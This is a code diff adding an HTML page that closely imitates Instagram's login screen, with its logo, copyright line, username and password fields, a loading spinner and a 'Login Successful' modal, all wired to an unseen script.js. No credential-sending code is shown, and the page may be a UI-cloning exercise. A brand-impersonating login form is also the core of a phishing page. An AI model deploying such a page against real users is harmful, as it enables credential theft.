@@ -1,1 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
+<div class="instagram-container">
+
+    <!-- Phone Preview -->
+    <div class="phone-container">
+        <div class="phone">
+            <div class="phone-notch"></div>
+            <div class="phone-content">
+                <img src="https://i.imgur.com/zYvZr4K.jpeg" class="phone-image" alt="">
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Section -->
+    <div class="login-section">
+
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+                 class="instagram-icon" />
+            <h1 class="instagram-text">Instagram</h1>
+        </div>
+
+        <!-- Error Box -->
+        <div id="errorContainer" class="error-container" style="display:none;">
+            <p id="errorMessage" class="error-text"></p>
+        </div>
+
+        <!-- Success Box -->
+        <div id="successContainer" class="success-container" style="display:none;">
+            <p id="successMessage" class="success-text"></p>
+        </div>
+
+        <!-- Loading -->
+        <div id="loadingContainer" class="loading-container" style="display:none;">
+            <div class="spinner"></div>
+            <p>Checking details...</p>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="login-form" onsubmit="handleLogin(event)">
+
+            <div class="input-wrapper">
+                <input 
+                    type="text" 
+                    id="email" 
+                    class="input-field"
+                    placeholder="Phone number, username or email"
+                    autocomplete="off"
+                    required
+                >
+                <span class="input-border"></span>
+            </div>
+
+            <div class="input-wrapper">
+                <input 
+                    type="password" 
+                    id="password" 
+                    class="input-field"
+                    placeholder="Password"
+                    autocomplete="off"
+                    required
+                >
+                <span class="input-border"></span>
+            </div>
+
+            <button id="loginButton" class="login-button">
+                <span class="button-text">Log in</span>
+            </button>
+
+        </form>
+
+        <div class="divider-container">
+            <div class="divider-line"></div>
+            <p class="divider-text">OR</p>
+            <div class="divider-line"></div>
+        </div>
+
+        <button class="facebook-button" onclick="handleFacebookLogin()">
+            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" class="facebook-icon">
+            Log in with Facebook
+        </button>
+
+        <div class="forgot-password-container">
+            <a class="forgot-password-link" onclick="handleForgotPassword()">Forgot password?</a>
+        </div>
+
+        <div class="signup-container">
+            <p class="signup-text">
+                Don't have an account?
+                <a class="signup-link" onclick="handleSignUp()">Sign up</a>
+            </p>
+        </div>
+
+        <div class="footer-links">
+            <a onclick="showInfo('About')">About</a>
+            <a onclick="showInfo('Help')">Help</a>
+            <a onclick="showInfo('Press')">Press</a>
+            <a onclick="showInfo('API')">API</a>
+            <a onclick="showInfo('Jobs')">Jobs</a>
+            <a onclick="showInfo('Privacy')">Privacy</a>
+            <a onclick="showInfo('Terms')">Terms</a>
+            <a onclick="showInfo('Locations')">Locations</a>
+            <a onclick="showInfo('Language')">Language</a>
+        </div>
+
+        <p class="copyright">© 2024 Instagram from Meta</p>
+
+    </div>
+</div>
+
+<!-- Success Modal -->
+<div id="successModal" class="modal" style="display:none;">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>Login Successful</h2>
+        </div>
+
+        <div class="modal-body">
+            <p id="welcomeMessage"></p>
+            <div class="success-animation">
+                <div class="checkmark">✔</div>
+            </div>
+        </div>
+
+        <div class="modal-footer">
+            <button class="modal-button" onclick="closeSuccessModal()">OK</button>
+        </div>
+
+    </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
